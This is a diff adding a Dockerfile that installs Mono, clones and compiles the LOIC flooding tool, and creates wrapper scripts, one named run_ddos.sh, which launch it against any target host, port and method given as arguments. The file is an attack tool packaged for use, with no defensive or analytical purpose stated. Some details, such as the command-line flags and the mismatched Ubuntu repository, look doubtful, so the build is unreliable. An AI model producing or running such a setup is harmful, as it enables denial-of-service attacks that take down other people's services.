@@ -1,0 +1,34 @@
+FROM ubuntu:latest
+
+RUN apt-get update -y && \
+    apt-get install -y build-essential && \
+    apt-get install -y wget && \
+    apt-get install -y git
+
+WORKDIR /root
+
+# Install Mono
+RUN apt-get install -y apt-transport-https dirmngr && \
+    apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF && \
+    echo "deb https://download.mono-project.com/repo/ubuntu stable-bionic main" | tee /etc/apt/sources.list.d/mono-official-stable.list && \
+    apt-get update -y && \
+    apt-get install -y mono-devel
+
+# Clone the LOIC repository
+RUN git clone https://github.com/NewEraCracker/LOIC.git
+
+WORKDIR /root/LOIC
+
+# Compile LOIC
+RUN xbuild /p:Configuration=Release LOIC.sln
+
+# Create a script to input variables to the GUI
+RUN echo "#!/bin/sh" > run_loic.sh && \
+    echo "mono LOIC.exe --target=\$1 --port=\$2 --method=\$3" >> run_loic.sh && \
+    chmod +x run_loic.sh
+
+# Create a script to execute the .sh file
+RUN echo "#!/bin/sh" > run_ddos.sh && \
+    echo "./run_loic.sh \$1 \$2 \$3" >> run_ddos.sh && \
+    chmod +x run_ddos.sh
+
